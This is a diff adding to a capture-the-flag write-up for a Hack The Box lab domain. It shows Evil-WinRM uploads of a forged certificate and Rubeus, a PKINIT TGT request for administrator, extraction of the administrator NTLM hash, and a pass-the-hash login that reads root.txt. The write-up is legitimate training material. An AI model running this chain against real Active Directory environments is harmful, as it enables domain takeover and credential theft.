@@ -659,7 +659,7 @@ We're going to cover them all.
 
 <br />
 
-### Certify/Rubeus:
+### 1ST OPTION - Certify/Rubeus:
 
 <br />
 
@@ -759,3 +759,112 @@ Verifying - Enter Export Password:
 
 <br />
 
+Then, we upload the `cert.pfx` and [Rubeus.exe](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries) to the victim machine:
+
+<br />
+
+```bash
+*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop> upload cert.pfx
+                                        
+Info: Uploading /opt/cert.pfx to C:\Users\Ryan.Cooper\Desktop\cert.pfx
+                                        
+Data: 4544 bytes of 4544 bytes copied
+                                        
+Info: Upload successful!
+*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop> upload Rubeus.exe
+                                        
+Info: Uploading /opt/Rubeus.exe to C:\Users\Ryan.Cooper\Desktop\Rubeus.exe
+                                        
+Data: 595968 bytes of 595968 bytes copied
+                                        
+Info: Upload successful!
+```
+
+<br />
+
+Finally, we only need to run this `asktgt` command to request a `TGT` for the administrator user:
+
+<br />
+
+```bash
+*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop> .\Rubeus.exe asktgt /user:administrator /certificate:C:cert.pfx
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.2.0
+
+[*] Action: Ask TGT
+
+[*] Using PKINIT with etype rc4_hmac and subject: CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb
+[*] Building AS-REQ (w/ PKINIT preauth) for: 'sequel.htb\administrator'
+[*] Using domain controller: fe80::7d5e:1149:d46d:bfe3%4:88
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+      doIGSDCCBkSgAwIBBaEDAgEWooIFXjCCBVphggVWMIIFUqADAgEFoQwbClNFUVVFTC5IVEKiHzAdoAMC
+      AQKhFjAUGwZrcmJ0Z3QbCnNlcXVlbC5odGKjggUaMIIFFqADAgESoQMCAQKiggUIBIIFBAlk/wmjAbNi
+      11uw74e4Qt0bcGB5iABgW9aRyObC44xm3nQOg9htodHtH8ruQq09csOBAdRgEJHyr6ojVwdMraRpRnds
+...[snip]...
+```
+
+<br />
+
+It works! However, if we try to enter administrator folder and get the root.txt, we don't have permissions to do it.
+
+To solve this, we can get the NTLM hash of the administrator user adding the following flags to our `asktgt` command:
+
+<br />
+
+- `/getcredentials`
+
+- `/show`
+
+- `/nowrap`
+
+<br />
+
+```bash
+*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop> .\Rubeus.exe asktgt /user:administrator /certificate:C:cert.pfx /getcredentials /show /nowrap
+...[snip]...
+[*] Getting credentials using U2U
+
+  CredentialInfo         :
+    Version              : 0
+    EncryptionType       : rc4_hmac
+    CredentialData       :
+      CredentialCount    : 1
+       NTLM              : A52F78E4C751E5F5E17E1E9F3E58F4EE
+```
+
+<br />
+
+After doing this, we can use this NTLM hash to gain access as administrator using `Evil-WinRM`:
+
+<br />
+
+```bash
+❯ evil-winrm -i 10.10.11.202 -u 'administrator' -H "A52F78E4C751E5F5E17E1E9F3E58F4EE"
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+sequel\administrator
+*Evil-WinRM* PS C:\Users\Administrator\Documents> type ..\Desktop\root.txt
+74a7c073ecbc149ea6400ac4bbxxxxxx
+```
+
+<br />
+
+## 2ND OPTION - Certipy:
+
+<br />
